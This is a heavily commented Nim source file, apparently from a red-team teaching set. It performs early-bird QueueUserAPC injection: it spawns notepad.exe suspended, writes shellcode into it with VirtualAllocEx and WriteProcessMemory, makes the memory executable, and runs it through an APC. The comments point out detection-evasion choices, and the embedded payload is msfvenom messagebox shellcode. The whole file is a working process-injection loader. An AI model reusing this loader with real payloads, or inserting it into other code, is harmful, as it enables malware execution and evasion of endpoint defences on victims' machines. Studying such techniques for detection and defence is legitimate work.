#[
    Author: Alh4zr3d, Twitter: @alh4zr3d
    License: BSD 3-Clause
    Compile: nim c -d:mingw -d:release --cpu:amd64 --app:gui QueueUserAPC.nim
]#

import winim/lean                                                   # Import winim library, with various Win32 vars, structs, and functions

proc injectQueueUserAPC[I, T](shellcode: array[I, T]): void =       # Start of the function that injects the shellcode

    var                                                             # Var definitions
        si: STARTUPINFOEX                                           # CreateProcess takes a StartupInfoEx struct, containing various flags and details about the process to be started (https://learn.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa)
        pi: PROCESS_INFORMATION                                     # PROCESS_INFORMATION struct, which Windows will populate after execution of CreateProcess with info about said process (https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information)
        ps: SECURITY_ATTRIBUTES                                     # Two SECURITY_ATTRIBUTES structs are needed here: one for the process itself and one for the process' main thread. This one is for the process. (https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)
        ts: SECURITY_ATTRIBUTES                                     # The second SECURITY_ATTRIBUTES struct, for the main thread. We can set a variety of flags on the process using these, but if we don't, Windows will simply choose the defaults which is fine in this case.
        res: WINBOOL                                                # A variable to store the result of CreateProcessA, which is a boolean that is 0 if the call succeeded and 1 if not.
        pHandle: HANDLE                                             # Variable to store a handle to the resulting created process
        tHandle: HANDLE                                             # Variable to store the handle to the main thread of the created process

    si.StartupInfo.cb = sizeof(si).cint                             # The only part of our StartupInfoEx struct that needs to be set in this case is the "cb" member, which needs to be set to the size of the overall struct.
    ps.nLength = sizeof(ps).cint                                    # Similar to above, the only part of our SECURITY_ATTRIBUTES structs we need to set is its overall size, in the "nLength" member
    ts.nLength = sizeof(ts).cint                                    # See previous note

    res = CreateProcess(                                            # CreateProcessA function call (https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
        NULL,                                                       # Similar to the structs, most of these options can be set to null for our purposes. This one is the optional application name; if null, Windows will derive it from the next option
        newWideCString(r"C:\Windows\notepad.exe"),                  # The command line to be executed; this can include parameters if you choose
        ps,                                                         # SECURITY_ATTRIBUTES struct for the process
        ts,                                                         # SECURITY_ATTRIBUTES struct for the main thread
        FALSE,                                                      # Whether or not the new process should inherit the handles of the creating process; we don't care about this so FALSE works fine.
        EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,           # Any creation flags we want to set for the process. We want to start the process in a suspended state, preventing the user from seeing it. This requires these two flags to be set.
        NULL,                                                       # Pointer to the environment block for the new process; if NULL, the same environment block from the calling process is used.
        NULL,                                                       # Current directory of new process; if NULL, the same directory as the calling process is used.
        addr si.StartupInfo,                                        # Pointer to the STARTUPINFO structure (or STARTUPINFOEX)
        addr pi                                                     # Pointer to the PROCESS_INFORMATION structure which will be populated by Windows with information about the new process
    )

    #[
        Another Nim-specific option here is to use the startProcess proc in the osproc library.
        This proc calls CreateProcess under the hood and without the above hassle.
        You can then execute the suspend() function on the new process to suspend it. Close() is 
        then called to ensure Nim cleans up all handles related to the process for us once it finishes:

        let tgtProcess = startProcess("C:\Windows\notepad.exe")
        tgtProcess.suspend()
        defer: tgtProcess.close()

        One potential issue with this option is that OpenProcess now needs to be called to get a handle
        to the main thread; less API calls is usually good for avoiding detection.
    ]#

    pHandle = pi.hProcess                                           # Saving our process handle in the variable we made for it
    tHandle = pi.hThread                                            # Saving the main thread handle in the variable we made for it

    let baseAddr = VirtualAllocEx(                                  # Calling VirtualAllocEx to allocate memory within the new process, just as we did in the CreateRemoteThread injection example                             
        pHandle,                                                    # Passing the process thread handle          
        NULL,                                                           
        cast[SIZE_T](shellcode.len),                                # Allocating enough memory for our shellcode        
        MEM_COMMIT,                                                     
        PAGE_READWRITE                                              # One potential point of suspicion for defensive solutions is PAGE_EXECUTE_READWRITE permissions on memory; we are avoiding that by not making it executable until later.        
    )

    var bytesWritten: SIZE_T                                        # Creating a variable to store the number of bytes written by the function

    let wSuccess = WriteProcessMemory(                              # Writing our shellcode into the newly allocated memory in the created process, just as seen in CreateRemoteThread example
        pHandle,                                                    # Process handle
        baseAddr,                                                   # Base address of our allocated memory
        unsafeAddr shellcode,                                       # Pointer to shellcode
        cast[SIZE_T](shellcode.len),                                # Length of shellcode
        addr bytesWritten                                           # Variable in which to store number of bytes written
    )

    var prevPro: DWORD = 0                                          # Creating variable to store previous memory protections

    var virPro = VirtualProtectEx(                                  # Calling VirtualProtectEx to change the protections on the memory to make it executable
        pHandle,                                                    # Process handle
        baseAddr,                                                   # Memory base address
        cast[SIZE_T](shellcode.len),                                # Length of memory to change
        PAGE_EXECUTE_READ,                                          # New protections
        addr prevPro                                                # Pointer to variable in which to store previous protections (in case we want to restore them later)
    )

    var success: DWORD = 0

    success = QueueUserAPC(cast[PAPCFUNC](baseAddr), tHandle, 0)    # Executing our shellcode by calling QueueUserAPC to add our shellcode to the asynchronous procedure call queue of the main process thread, causing it to be executed alongside the main thread
                                                                    # (https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)
    success = ResumeThread(tHandle)                                 # Calling ResumeThread to continue execution of the main thread, executing our shellcode

    CloseHandle(tHandle)                                            # Cleaning up by closing up our handles and preventing handle leaks
    CloseHandle(pHandle)

when defined(windows):

    var shellcode: array[295, byte] = [                             # msfvenom -p windows/x64/messagebox -f nim
    byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,
    0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,
    0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,0x52,0x18,0x3e,0x48,
    0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,0x0f,0xb7,
    0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,
    0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
    0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,
    0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,
    0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,0x18,0x3e,
    0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,
    0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,
    0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,
    0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,
    0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x3e,
    0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
    0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,
    0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,
    0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x3e,0x48,0x8b,
    0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,0x00,0x00,
    0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,
    0x8d,0x85,0x0f,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,
    0x83,0x56,0x07,0xff,0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,
    0xa2,0x56,0xff,0xd5,0x48,0x65,0x6c,0x6c,0x6f,0x2c,0x20,0x66,
    0x72,0x6f,0x6d,0x20,0x4d,0x53,0x46,0x21,0x00,0x4d,0x65,0x73,
    0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00]


when isMainModule:                                                  # Nim equivalent of "if __name__ == '__main__':" in Python
    injectQueueUserAPC(shellcode)